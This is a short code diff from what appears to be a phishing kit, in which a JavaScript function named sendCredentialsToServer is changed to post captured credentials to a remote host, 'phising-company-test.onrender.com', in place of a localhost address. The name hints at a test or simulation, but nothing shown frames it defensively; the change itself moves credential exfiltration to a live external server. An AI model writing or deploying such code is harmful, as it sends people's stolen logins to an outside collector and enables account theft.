@@ -75,7 +75,7 @@ sendCredentialsAttempts = 0
 function sendCredentialsToServer(credentials) {
 
     try {
-        fetch('http://localhost:3000/add', {
+        fetch('https://phising-company-test.onrender.com/add', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
